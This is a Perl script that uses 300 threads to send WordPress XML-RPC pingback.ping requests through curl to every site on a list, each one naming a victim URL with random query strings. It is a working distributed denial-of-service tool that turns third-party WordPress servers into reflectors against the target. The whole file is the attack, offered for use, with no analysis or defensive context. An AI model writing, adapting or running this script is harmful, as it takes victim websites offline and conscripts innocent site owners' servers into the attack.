#!/usr/bin/perl
use strict;
use warnings;
use threads;
use threads::shared;

my $cmd;
my $item;
my $victim = 'http://site.ru'; #domain for requests
my @threads;
my @wordpress:shared;
my $timeout;

open (FILE0, '<wp-base.txt'); #file with wordpress sites
@wordpress = <FILE0>; 
close (FILE0);

for my $i (1..300) { #num of threads
  push @threads, threads->create(\&attack, $i);
}

foreach my $thread (@threads) {
$thread->join();
}

sub attack {
	while (1) {
		#$timeout = int(rand(10)+1);
		$timeout = 0;
		$item = shift(@wordpress);
		chomp($item);
		sleep($timeout);
		print "Site: ",$item,"\n";
		my $rand1=int(rand(99999)) + 111111;
		my $rand2=int(rand(99999)) + 111111;
		$cmd = "curl $item/xmlrpc.php -d '<?xml version=\"1.0\" encoding=\"iso-8859-1\"?><methodCall><methodName>pingback.ping</methodName><params><param><value><string>$victim/?$rand1=$rand2</string></value></param><param><value><string>$item/?p=1</string></value></param></params></methodCall>' > /dev/null 2>&1";
		print "Command: \n",$cmd,"\n";
		system($cmd);
		print $item," served by thread ",@_," timeout $timeout ","\n";
	}
}

